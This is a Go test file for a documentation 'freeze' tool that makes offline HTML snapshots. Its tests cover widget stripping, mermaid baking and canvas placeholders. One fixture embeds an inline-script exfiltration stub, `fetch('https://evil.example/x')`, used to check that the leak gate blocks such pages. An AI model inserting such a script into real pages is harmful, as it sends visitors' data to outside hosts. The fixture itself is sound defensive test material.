package freeze

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// libDir resolves the real stddoc-lib/lib (for the offline-kit assets). The
// freeze package lives at go/internal/freeze, so the repo root is ../../.. and
// the lib dir is go/stddoc-lib/lib.
func libDir(t *testing.T) string {
	t.Helper()
	root, err := filepath.Abs("../../..")
	if err != nil {
		t.Fatalf("resolve repo root: %v", err)
	}
	return filepath.Join(root, "go", "stddoc-lib", "lib")
}

// writePublished creates a t.TempDir-based "published" dir with the given pages
// and returns its path. The dir is nested so Run's sibling frozen/ lands in the
// temp tree, not the repo.
func writePublished(t *testing.T, pages map[string]string) string {
	t.Helper()
	out := filepath.Join(t.TempDir(), "published")
	if err := os.MkdirAll(out, 0o755); err != nil {
		t.Fatal(err)
	}
	for name, body := range pages {
		if err := os.WriteFile(filepath.Join(out, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return out
}

// a minimal, already-self-contained page (no mermaid) that still carries the
// served-only widget tags freeze must strip.
const cleanPage = `<!doctype html><html><head>
<link rel="stylesheet" href="/lib/feedback.css">
</head><body>
<main class="doc"><h1>Hello</h1><p>d2-only doc, no diagrams.</p></main>
<script src="/lib/feedback.js" defer></script>
</body></html>`

// a page carrying a live mermaid source block (the form serve injects).
const mermaidPage = `<!doctype html><html><head>
<link rel="stylesheet" href="/lib/feedback.css">
<script src="https://cdn.example/mermaid.min.js"></script>
</head><body>
<main class="doc"><h1>Diagram</h1>
<div class="mermaid">graph TD; A--&gt;B</div>
</main>
<script src="/lib/feedback.js" defer></script>
</body></html>`

// TestRun_CleanDocFreezesNoRenderer proves a d2-only / no-mermaid published dir
// freezes clean with NO renderer: frozen/ dir + .zip produced, banner present,
// widget tags stripped, zero leaks.
func TestRun_CleanDocFreezesNoRenderer(t *testing.T) {
	out := writePublished(t, map[string]string{"index.html": cleanPage})

	res, err := Run(out, "Hello Doc", "", libDir(t), nil) // nil renderer is fine: no mermaid
	if err != nil {
		t.Fatalf("clean doc must freeze with no renderer: %v", err)
	}

	// frozen dir + zip exist.
	if fi, err := os.Stat(res.FrozenDir); err != nil || !fi.IsDir() {
		t.Fatalf("frozen dir not created: %v", err)
	}
	if fi, err := os.Stat(res.ZipPath); err != nil || fi.Size() == 0 {
		t.Fatalf("zip not produced: %v", err)
	}
	if !strings.HasPrefix(filepath.Base(res.ZipPath), "hello-doc_frozen_") {
		t.Errorf("zip name should use the slug: %s", filepath.Base(res.ZipPath))
	}

	frozen, err := os.ReadFile(filepath.Join(res.FrozenDir, "index.html"))
	if err != nil {
		t.Fatal(err)
	}
	got := string(frozen)
	if !strings.Contains(got, "Frozen snapshot") {
		t.Error("frozen page must carry the frozen-snapshot banner")
	}
	if !strings.Contains(got, "Hello Doc") {
		t.Error("banner must carry the title")
	}
	if strings.Contains(got, "/lib/feedback.js") || strings.Contains(got, "/lib/feedback.css") {
		t.Error("served-only widget tags must be stripped")
	}
	if res.Baked != 0 {
		t.Errorf("clean doc bakes nothing, got Baked=%d", res.Baked)
	}
}

// TestRun_RefusesMermaidWithoutRenderer proves a page with a live mermaid block
// AND no renderer is REFUSED loudly — no broken snapshot written.
func TestRun_RefusesMermaidWithoutRenderer(t *testing.T) {
	out := writePublished(t, map[string]string{"d.html": mermaidPage})

	res, err := Run(out, "Diagram Doc", "", libDir(t), nil)
	if err == nil {
		t.Fatal("freeze must REFUSE a mermaid doc when no renderer is available")
	}
	if res != nil {
		t.Error("no result on refusal")
	}
	if !strings.Contains(err.Error(), "mermaid") || !strings.Contains(err.Error(), "REFUSED") {
		t.Errorf("refusal must name mermaid and be clearly a refusal: %v", err)
	}
}

// leakyPage survives widget-strip (no /lib/ or mermaid tags) yet carries an
// inline-script exfil the leak gate must catch AFTER pages are written to disk.
const leakyPage = `<!doctype html><html><head></head><body>
<main class="doc"><h1>Leak</h1></main>
<script>fetch('https://evil.example/x')</script>
</body></html>`

// TestRun_BlockedFreezeLeavesNothing proves a blocked freeze leaves no
// complete-looking trap on disk (finding 2026-08-12 NEW 3). The gate blocks on
// the inline-exfil, and the sibling frozen/ dir — populated before the check —
// must be removed on the error path, not stranded beside the real deliverable.
func TestRun_BlockedFreezeLeavesNothing(t *testing.T) {
	out := writePublished(t, map[string]string{"index.html": leakyPage})

	res, err := Run(out, "Leaky Doc", "", libDir(t), nil)
	if err == nil {
		t.Fatal("freeze must block a page carrying an inline-script exfil")
	}
	if res != nil {
		t.Error("no result on a blocked freeze")
	}
	frozen := filepath.Join(filepath.Dir(out), "frozen")
	if _, statErr := os.Stat(frozen); !os.IsNotExist(statErr) {
		t.Errorf("a blocked freeze must leave NO frozen/ dir behind (trap artifact); stat err = %v", statErr)
	}
}

// TestRun_BakesWithInjectedRenderer proves that with a renderer present, the
// live mermaid div is replaced by the rendered SVG, the offline pan-zoom kit is
// inlined, and the frozen page still passes the leak gate. The renderer is a
// FAKE — the suite never depends on a real mmdc.
func TestRun_BakesWithInjectedRenderer(t *testing.T) {
	out := writePublished(t, map[string]string{"d.html": mermaidPage})

	const stub = `<svg xmlns="http://www.w3.org/2000/svg"><text>baked</text></svg>`
	var sawSource string
	fake := func(source string) (string, error) {
		sawSource = source
		return stub, nil
	}

	res, err := Run(out, "Diagram Doc", "", libDir(t), fake)
	if err != nil {
		t.Fatalf("freeze with a renderer must succeed (and pass the leak gate): %v", err)
	}
	if res.Baked != 1 {
		t.Errorf("expected 1 baked page, got %d", res.Baked)
	}

	// the renderer receives the UNESCAPED source (publish esc()s &gt;).
	if !strings.Contains(sawSource, "A-->B") {
		t.Errorf("renderer must receive unescaped source, got %q", sawSource)
	}

	frozen, err := os.ReadFile(filepath.Join(res.FrozenDir, "d.html"))
	if err != nil {
		t.Fatal(err)
	}
	got := string(frozen)
	if !strings.Contains(got, "<text>baked</text>") {
		t.Error("the live mermaid div must be replaced by the rendered SVG")
	}
	if strings.Contains(got, "cdn.example/mermaid.min.js") {
		t.Error("the mermaid CDN script must be stripped")
	}
	// the offline kit must be inlined (frozen-panzoom controller marker).
	if !strings.Contains(got, "frozen pan-zoom controller (inlined)") {
		t.Error("the offline pan-zoom kit must be re-inlined for mermaid pages")
	}
	if !strings.Contains(got, "std-doc mermaid kit (frozen, inlined)") {
		t.Error("mermaid.css must be re-inlined for mermaid pages")
	}
}

// TestBakeMermaid_NoMermaidIsNoop proves a page with no mermaid is returned
// unchanged with hadMermaid=false, even with a nil renderer.
func TestBakeMermaid_NoMermaidIsNoop(t *testing.T) {
	got, had, err := BakeMermaid(cleanPage, nil)
	if err != nil {
		t.Fatal(err)
	}
	if had {
		t.Error("clean page reports no mermaid")
	}
	if got != cleanPage {
		t.Error("clean page is returned byte-identical")
	}
}

// CAPABILITY: a live `canvas` mount degrades to a static placeholder at freeze —
// the external iframe (which would fail the Covenant IV gate) is gone, the label
// is carried, and the honest "open in serve mode" note is present.
func TestFreezeCanvas_DegradesLiveMountToPlaceholder(t *testing.T) {
	live := "<div class='canvas-embed' data-canvas-src='http://localhost:8747/'>" +
		"<div class='dc-top'><span class='dc-label'>architecture sketch</span>" +
		"<span class='dc-render'>render: canvas</span><button class='fz-btn'>full</button></div>" +
		"<iframe class='canvas-frame' src='http://localhost:8747/' sandbox='allow-scripts allow-same-origin'></iframe></div>"
	got := FreezeCanvas(live)
	if strings.Contains(got, "<iframe") {
		t.Errorf("frozen canvas must NOT keep the iframe (external ref):\n%s", got)
	}
	if strings.Contains(got, "http://localhost") {
		t.Errorf("frozen canvas must carry no external src:\n%s", got)
	}
	if !strings.Contains(got, "canvas-frozen") || !strings.Contains(got, "live co-drawing surface") {
		t.Errorf("frozen canvas must render the honest placeholder:\n%s", got)
	}
	if !strings.Contains(got, "architecture sketch") {
		t.Errorf("frozen canvas must carry the original label:\n%s", got)
	}
}

// CAPABILITY: a page with no canvas is returned untouched (no false matches).
func TestFreezeCanvas_NoCanvasIsNoop(t *testing.T) {
	if got := FreezeCanvas(cleanPage); got != cleanPage {
		t.Error("clean page must pass through FreezeCanvas byte-identical")
	}
}

// CAPABILITY (Decision 1): when the author captured a scene snapshot, freeze
// inlines the REAL drawing instead of the placeholder — freeze-clean, no iframe,
// no "was live" note.
func TestFreezeCanvas_InlinesAuthorSnapshot(t *testing.T) {
	live := "<div class='canvas-embed' data-canvas-src='http://localhost:8747/'>" +
		"<div class='dc-top'><span class='dc-label'>sketch</span></div>" +
		"<div class='canvas-snapshot' hidden><svg id='the-drawing'><rect/></svg></div>" +
		"<iframe class='canvas-frame' src='http://localhost:8747/'></iframe></div>"
	got := FreezeCanvas(live)
	if strings.Contains(got, "<iframe") || strings.Contains(got, "http://localhost") {
		t.Errorf("snapshot freeze must drop the live iframe/external ref:\n%s", got)
	}
	if !strings.Contains(got, "<svg id='the-drawing'>") {
		t.Errorf("frozen canvas must inline the captured snapshot SVG:\n%s", got)
	}
	if strings.Contains(got, "can't co-draw") {
		t.Errorf("with a snapshot, the placeholder note must NOT appear:\n%s", got)
	}
	if strings.Contains(got, "hidden>") {
		t.Errorf("the snapshot must be unhidden in the frozen copy:\n%s", got)
	}
}

// TestFreezeCanvas_V2AttributeOrder is the regression guard for the canvas-v2
// freeze regression: the renderer emits `data-canvas-board` BEFORE `class`, so
// an order-pinned pattern silently no-ops — the frozen page keeps a live
// <iframe src='codraw:…'> and the author's snapshot stays `hidden`, i.e. the
// drawing disappears from the frozen doc. The freeze gate cannot catch this,
// because `codraw:` is not an http(s) URL and so is not an "external ref".
// This fixture is copied from real `stddoc publish` output, NOT hand-written —
// which is the entire point: the old fixtures passed while every real page broke.
func TestFreezeCanvas_V2AttributeOrder(t *testing.T) {
	live := `<div data-canvas-board='as-is' class='canvas-embed' data-canvas-src='codraw:as-is'>` +
		`<div class='dc-top'><span class='dc-label'>AS-IS board</span></div>` +
		`<div class='canvas-snapshot' hidden><svg id='drawing'></svg></div>` +
		`<iframe class='canvas-frame' src='codraw:as-is'></iframe></div>`

	got := FreezeCanvas(live)

	if strings.Contains(got, "<iframe") {
		t.Error("frozen canvas must not keep the live iframe (v2 attribute order)")
	}
	if strings.Contains(got, "hidden") {
		t.Error("the author snapshot must be UNHIDDEN in the frozen output")
	}
	if !strings.Contains(got, "<svg id='drawing'></svg>") {
		t.Error("the author snapshot SVG must be inlined into the frozen output")
	}
	if !strings.Contains(got, "AS-IS board") {
		t.Error("the dc-label caption must be carried into the frozen block")
	}
}
